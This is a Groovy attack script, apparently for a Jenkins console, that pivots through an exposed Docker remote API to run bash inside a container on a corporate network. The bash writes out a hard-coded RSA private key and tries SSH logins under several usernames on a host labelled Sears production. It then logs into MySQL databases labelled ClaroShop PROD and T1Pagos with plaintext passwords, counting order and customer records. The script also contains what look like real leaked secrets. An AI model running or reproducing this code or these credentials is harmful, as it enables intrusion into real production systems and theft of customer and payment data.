// Pivot via Docker container → SSH a PROD Sears + MySQL ClaroShop PROD
import groovy.json.JsonOutput
import groovy.json.JsonSlurper

def dockerApi = "http://172.27.140.148:4243"
def containerId = "5b32e909c295"

def httpPost = { String urlStr, String jsonBody ->
  def conn = (HttpURLConnection) new URL(urlStr).openConnection()
  conn.setRequestMethod("POST")
  conn.setDoOutput(true)
  conn.setConnectTimeout(8000)
  conn.setReadTimeout(120000)
  conn.setRequestProperty("Content-Type", "application/json")
  if (jsonBody) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
  def code = conn.getResponseCode()
  def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
  conn.disconnect()
  return [code: code, body: body]
}

def execIn = { String cmd ->
  def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + JsonOutput.toJson(cmd) + ']}'
  def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
  if (r1.code != 201) return "EXEC_CREATE_FAIL HTTP ${r1.code}: ${r1.body}"
  def execId = new JsonSlurper().parseText(r1.body).Id
  def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
  return r2.body
}

// RSA key base64 encoded
def rsaKeyB64 = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBK" +
  "WVTU1VpQmpYQ3hqUjliV2I5MEFVSTBTYXJBTHYZ030lZvUY2Bc7a4VZPXcgfvTSA" +
  "mIvMiNiEPR/+hsrUhHtDtz55JqtKzk4jBxBUUFcaIreqOmKyxv3hCEmMAuFLPiFT" +
  "diIkDs3Wpu+6JNney6PLuxOlffhA4zuS4JpNZfZz1EeEC3AIK3zLLbSp9Y8EFJ4oO" +
  "8QAZ65n4dS/f/G+U/qckJjv9pCB/c64hun3h4Ilw34Bx24q4jOTTy1HHzAzWEGhjB" +
  "LZqaNf+mxDTulXy3LCi5esPE4ILjoXFHrPD2t9hF1h6JqRUjNbsP+AMtmFUyShPB" +
  "oWEy/t/8Z4CislFQHtRyMIScbo4QywIBIwKCAQEAoScvDfOTuKAl7gPmQMgO7zl/n" +
  "MhH3mj8OZAQJgXWnb8NeATHlDZ1eS3VSazhQosGg5FToQRi6ZjW/jZ2SRz7meXqI" +
  "mBObmMFqlXUnvf3pIUTGAslczJmmERt9WOkRM3K5dDdr1r+Dxy6yvZG2A3L2HXde4" +
  "5rTljGK6yUhCc2NI7sr9UFoTMZ6Tzjrk8OhWdLUxDtQVwwpacDwahWXbaV5B+vnqS" +
  "2MTBJ61jZpCVRl504NFO2rg2O1Lg3E8CgzLDY7A159gAG5xKaiVM36JUBp377x0OJ" +
  "NhCunPI0q/UoyGvf5VJwjoLflTbZqrQl2FpNA7FFiLa9eJqsWYJV8LNliwKBgQDUc" +
  "0bi+0M3ByuMFqRgCAIr7mv6KTA5kF08cVQNIzL5bAO3n+ejIKRfRFBmjKUGAuz6v4" +
  "FgE8pX892IUSt/fOzd/g4Z4nYuntmOSHmsStwWyNhfobbR0c9ObJnxjtCFI1mjBDS" +
  "kJYVZ0MQvQ9sgDIvAH4sVq3sWgDtdILPPI5opSwKBgQDH5htKg8Hwp3tj5uOL677J" +
  "ePqYPnvE9m0NA34SC/w6I75zJ4zsR42qof+ow6Z2ZYB6dal1AALc4dfxGuyTT8Ylt" +
  "QnmNcpFNgdP4Skiy+A8FZYwJ4OuPXBDqdaPDuZdgEy7LWMVlNCnBVrfeRfr/QZWac" +
  "4fzOzvC9u9/vfPLYaGgQKBgQDOYVrN3iQJke/J6hwFhB9d4EuijmlcfZxmmfng4F1n" +
  "UvxL+mv9jWx5zVVq7wa1Ye2F3prvnjJGz6QAw+Ecwn+zFA2yvrvyxjJs9fKKHNXM/" +
  "Z790EsyOYeOAxkzzJAMTjnRjw6Q0/3iOIQQqFE1E4BxfbpPkKN08ZjA3fCAE/TXpw" +
  "KBgQDCL/1BEkdezpUfOBA+x8CmdYW4dzZnkEytjl02GkV6TpvAUk5h3xvnlg5MK8Z" +
  "HIMXzTbqO6hFo22QOybKduzWDty4wFv8BZ69U6VspHdKDgq8ndtewk3Re/MHMzKVE" +
  "4wi11FGf76Yel3zZFoxEVOGVxd4thT3vh9zHMjKOvoKuiwKBgFZ4LHsqhnU/o7DBdV" +
  "6FB67pWtrVCZNGNf30Swd9PFzGJbSCXRKJ9IwdjYqClYgkyxylo5H6Nzl0Y7wGqKo" +
  "GBWMIOvpkG0mrSOYMB0iGwXnWS1g94xeRw32kCtOrnvIVC8SKdmm5H+uzoN+WpSwC" +
  "+oRkS7cIGjzthuw7omygk1ng" 

// Bash script approach (no PHP parsing issues)
def bashCmd = '''
# Write the actual RSA key
mkdir -p /tmp/.ssh_pivot && cat > /tmp/.ssh_pivot/key << 'RSAEOF'
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApeSSUiBjXCxjR9bWb90AUJ0SbLANv030lZvUY2Bc7a4VZPXc
gfvTSAmIvMiNiEPR/+hsrUhHtDtz55JqtKzk4jBxBUUFcaIreqOmKyxv3hCEmMAu
FLPiFTdiIkDs3Wpu+6JNney6PLuxOlffhA4zuS4JpNZfZz1EeEC3AIK3zLLbSp9Y
8EFJ4oO8QAZ65n4dS/f/G+U/qckJjv9pCB/c64hun3h4Ilw34Bx24q4jOTTy1HHz
AzWEGhjBLZqaNf+mxDTulXy3LCi5esPE4ILjoXFHrPD2t9hF1h6JqRUjNbsP+AMt
mFUyShPBoWEy/t/8Z4CislFQHtRyMIScbo4QywIBIwKCAQEAoScvDfOTuKAl7gPm
QMgO7zl/nMhH3mj8OZAQJgXWnb8NeATHlDZ1eS3VSazhQosGg5FToQRi6ZjW/jZ2
SRz7meXqImBObmMFqlXUnvf3pIUTGAslczJmmERt9WOkRM3K5dDdr1r+Dxy6yvZG
2A3L2HXde45rTljGK6yUhCc2NI7sr9UFoTMZ6Tzjrk8OhWdLUxDtQVwwpacDwahW
XbaV5B+vnqS2MTBJ61jZpCVRl504NFO2rg2O1Lg3E8CgzLDY7A159gAG5xKaiVM3
6JUBp377x0OJNhCunPI0q/UoyGvf5VJwjoLflTbZqrQl2FpNA7FFiLa9eJqsWYJV
8LNliwKBgQDUc0bi+0M3ByuMFqRgCAIr7mv6KTA5kF08cVQNIzL5bAO3n+ejIKRf
RFBmjKUGAuz6v4FgE8pX892IUSt/fOzd/g4Z4nYuntmOSHmsStwWyNhfobbR0c9O
bJnxjtCFI1mjBDSkJYVZ0MQvQ9sgDIvAH4sVq3sWgDtdILPPI5opSwKBgQDH5htK
g8Hwp3tj5uOL677JePqYPnvE9m0NA34SC/w6I75zJ4zsR42qof+ow6Z2ZYB6dal1
AALc4dfxGuyTT8YltQnmNcpFNgdP4Skiy+A8FZYwJ4OuPXBDqdaPDuZdgEy7LWMV
lNCnBVrfeRfr/QZWac4fzOzvC9u9/vfPLYaGgQKBgQDOYVrN3iQJke/J6hwFhB9d
4EuijmlcfZxmmfng4F1nUvxL+mv9jWx5zVVq7wa1Ye2F3prvnjJGz6QAw+Ecwn+z
FA2yvrvyxjJs9fKKHNXM/Z790EsyOYeOAxkzzJAMTjnRjw6Q0/3iOIQQqFE1E4Bx
fbpPkKN08ZjA3fCAE/TXpwKBgQDCL/1BEkdezpUfOBA+x8CmdYW4dzZnkEytjl02
GkV6TpvAUk5h3xvnlg5MK8ZHIMXzTbqO6hFo22QOybKduzWDty4wFv8BZ69U6Vsp
HdKDgq8ndtewk3Re/MHMzKVE4wi11FGf76Yel3zZFoxEVOGVxd4thT3vh9zHMjKO
voKuiwKBgFZ4LHsqhnU/o7DBdV6FB67pWtrVCZNGNf30Swd9PFzGJbSCXRKJ9Iwd
jYqClYgkyxylo5H6Nzl0Y7wGqKoGBWMIOvpkG0mrSOYMB0iGwXnWS1g94xeRw32k
CtOrnvIVC8SKdmm5H+uzoN+WpSwC+oRkS7cIGjzthuw7omygk1ng
-----END RSA PRIVATE KEY-----
RSAEOF
chmod 600 /tmp/.ssh_pivot/key

echo "=== KEY FILE ==="
ls -la /tmp/.ssh_pivot/key
head -1 /tmp/.ssh_pivot/key

echo ""
echo "=== SSH SCAN 172.27.141.24 ==="
for USER in jenkins root deployer sears ec2-user ubuntu www-data apache; do
  RESULT=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o BatchMode=yes -o PasswordAuthentication=no \
    -i /tmp/.ssh_pivot/key ${USER}@172.27.141.24 \
    "echo SSH_OK_${USER}; id; hostname; ls / 2>&1 | head -5" 2>&1)
  if echo "$RESULT" | grep -q "SSH_OK"; then
    echo "SUCCESS USER=$USER"
    echo "$RESULT"
    break
  else
    ERR=$(echo "$RESULT" | tail -1)
    echo "FAIL ${USER}: $ERR"
  fi
done

echo ""
echo "=== MYSQL 172.27.140.151:3306 (ClaroShop PROD) ==="
which mysql && mysql -h172.27.140.151 -P3306 -uappmsclient -pd9FNoft#NSaEZgvt --connect-timeout=5 -e "SHOW DATABASES; SELECT COUNT(*) FROM tienda.pedidos; SELECT COUNT(*) FROM tienda.clientes;" 2>&1 || echo "mysql binary not found or failed"

echo ""
echo "=== MYSQL 172.27.141.4:3306 (T1Pagos from .23) ==="
which mysql && mysql -h172.27.141.4 -P3306 -uapp_t1 -p"wUt22Us2CUh#+M=" --connect-timeout=5 -e "SHOW DATABASES; SHOW GRANTS;" 2>&1 || echo "mysql not found"

rm -rf /tmp/.ssh_pivot
echo "=== DONE ==="
'''

println "=== DOCKER: SSH PROD SEARS + MYSQL CLAROSHOP ==="
println execIn(bashCmd)
println "=== FIN ==="
